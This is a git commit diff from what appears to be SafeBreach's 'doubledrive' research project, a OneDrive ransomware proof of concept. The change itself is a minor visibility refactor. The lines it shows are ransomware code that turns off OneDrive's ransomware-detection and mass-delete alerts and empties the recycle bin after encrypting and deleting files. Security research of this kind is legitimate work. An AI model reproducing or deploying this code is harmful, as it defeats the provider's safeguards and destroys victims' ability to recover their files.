56859a1ad00aa06f626e0535bce02cc8b6a15336
Or Yair <or.yair@safebreach.com>
2023-06-20 13:53:59 +0300

    changed OneDriveRansomware property to be protected instead of private

--- src/doubledrive/cloud_ransomware/onedrive_ransomware.py
+++ src/doubledrive/cloud_ransomware/onedrive_ransomware.py
@@ -9,14 +9,14 @@ class OneDriveRansomware(CloudDriveRansomware):
         super().__init__(logged_in_cloud_drive, save_key_dir_path)
         self.__first_stage_done_delay = first_stage_done_delay
         self.__second_stage_done_delay = second_stage_done_delay
-        self.__cloud_drive.patch_user_preferences({"RansomwareDetection": False, "MassDelete": False})
+        self._cloud_drive.patch_user_preferences({"RansomwareDetection": False, "MassDelete": False})
 
     def _first_stage_overwriting_finished_callback(self, paths_to_encrypted_contents):
         time.sleep(self.__first_stage_done_delay)
     
     def _second_stage_deletion_finished_callback(self, paths_to_encrypted_contents):
         time.sleep(self.__second_stage_done_delay)
-        self.__cloud_drive.empty_recycle_bin()
+        self._cloud_drive.empty_recycle_bin()
     
     def _third_stage_recreation_finished_callback(self, paths_to_encrypted_contents):
         pass
